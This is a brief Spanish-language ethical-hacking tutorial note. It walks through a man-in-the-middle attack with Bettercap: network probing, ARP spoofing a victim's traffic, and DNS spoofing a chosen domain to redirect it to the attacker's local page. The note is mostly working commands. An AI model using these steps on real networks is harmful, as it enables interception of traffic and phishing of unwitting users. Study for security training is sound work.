#Vulnerabilidades #HackingEtico 

Este ataque consiste en ubicarnos en la mitad del router y la maquina atacante asi podrian pasar primero los paquetes por nosotros antes que por el router, y asi teniendo control de los paquetes.

## Bettercap:

- Instalamos Bettercap: 
```bash
apt install Bettercap
```

- Para detectar los equipos que se encuentran en nuestra red vamos a ultilizar bettercap y poner el siguiente comando

```bash
net.probe on
```

- Ahora vamos a envenenar el trafico de nuestra maquina victima con ARP, para eso tenemos que saber la IP de esta misma y poner el siguiente comando.

```bash
set arp.spoof.targets #IP
```

- Para confirmar de que si estamos envenenado la maquina con ARP SPOOF. Colocamos el siguiente comando.

```bash
arp.spoof on
```

**Procedemos a realizar un ataque de DNS Spoofing**
- Colocamos el siguiente comando para que la victima al entrar a cierto sitio web se le haga un re direccionamiento a mi localhost donde tengo almacenado un archivo *.html*

```bash
set dns.spoof.domains "URL A HACER SPOOF"
```

- Ahora configuramos para que se muestre nuestra pagina local al entrar a dicho sitio web
```bash
set dns.spoof.address "NUestra IP"
```

- Y para comprobar que todo a funcionado correctamente vamos a colocar el siguiente comando
```bash 
dns.spoof on 
```

